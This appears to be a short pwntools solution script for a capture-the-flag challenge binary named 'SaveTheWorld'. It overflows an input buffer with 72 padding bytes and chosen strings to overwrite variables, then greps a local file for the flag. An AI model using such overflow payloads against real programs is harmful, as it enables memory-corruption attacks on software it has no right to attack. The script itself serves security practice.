from pwn import *  # type: ignore

context.binary = "./SaveTheWorld"
p = process()
p.sendline(b"A" * 72 + b"Jotaro!!" + b"Star Platinum!!!" + b"HORA" + b"9999")
p.recvuntil(b"Congratulation, you won!!!")
os.system("grep .*{.*}.* victory_recap.txt")
